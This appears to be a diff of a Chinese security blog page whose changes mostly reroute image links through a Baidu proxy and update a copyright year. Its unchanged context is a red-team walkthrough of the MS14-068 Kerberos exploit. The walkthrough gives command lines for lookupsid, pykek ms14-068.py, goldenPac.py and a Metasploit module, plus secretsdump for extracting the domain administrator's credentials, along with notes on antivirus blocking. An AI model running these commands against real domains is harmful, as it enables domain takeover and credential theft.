@@ -238,23 +238,23 @@
 <p><strong>获取SID</strong></p>
 <p>360安全大脑会拦截此行为</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 lookupsid.py hack.com/test:<span class="string">"111111"</span>@<span class="number">10.211</span><span class="number">.55</span><span class="number">.6</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pq0sd0cj20ut0u0ahv.jpg" alt="img"></p>
+<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h47pq0sd0cj20ut0u0ahv.jpg" alt="img"></p>
 <h4 id="pykek">pykek</h4>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ms14<span class="number">-068.</span>py -u test@hack.com -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3748771105</span><span class="number">-1916670041</span><span class="number">-1145606913</span><span class="number">-1110</span> -d <span class="number">10.211</span><span class="number">.55</span><span class="number">.6</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pq5fek9j21l40dm78e.jpg" alt="img"></p>
+<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h47pq5fek9j21l40dm78e.jpg" alt="img"></p>
 <p>导入票据，验证</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=TGT_test@hack.com.ccache</span><br><span class="line">python3 secretsdump.py hack.com/test@DC.hack.com -no-<span class="keyword">pass</span> -k -dc-ip <span class="number">10.211</span><span class="number">.55</span><span class="number">.6</span> -just-dc-user administrator</span><br></pre></td></tr></table></figure>
 <p>在域外需要指定域内DNS，否者会报错</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pq87b2yj21kg0b4n0g.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pqbkuc5j21la09yq5r.jpg" alt="img"></p>
+<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h47pq87b2yj21kg0b4n0g.jpg" alt="img"></p>
+<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h47pqbkuc5j21la09yq5r.jpg" alt="img"></p>
 <h3 id="impacket">impacket</h3>
 <p>godenPac结合了psexec和ms14-068</p>
 <p>在开启SMB session的时候会杀软被拦截。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 goldenPac.py hack.com/test:<span class="string">"111111"</span>@DC.hack.com -dc-ip <span class="number">10.211</span><span class="number">.55</span><span class="number">.6</span> -debug</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pqevb0ij21e10u0dmv.jpg" alt="img"></p>
+<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h47pqevb0ij21e10u0dmv.jpg" alt="img"></p>
 <h3 id="msf">msf</h3>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use /auxiliary/admin/kerberos/ms14068kerberos_checksum/</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pqioth7j21qi0dojvc.jpg" alt="img"></p>
+<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h47pqioth7j21qi0dojvc.jpg" alt="img"></p>
 <h4 id="reference">Reference</h4>
 <p>daiker@360RedTeam</p>
 
@@ -450,7 +450,7 @@
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; Kat 2022 
+                    Copyright &copy; Kat 2023 
                     <br>
                     <span style="display: inline-block; margin: 0 5px;">
                         <i class="fa fa-heart"></i>
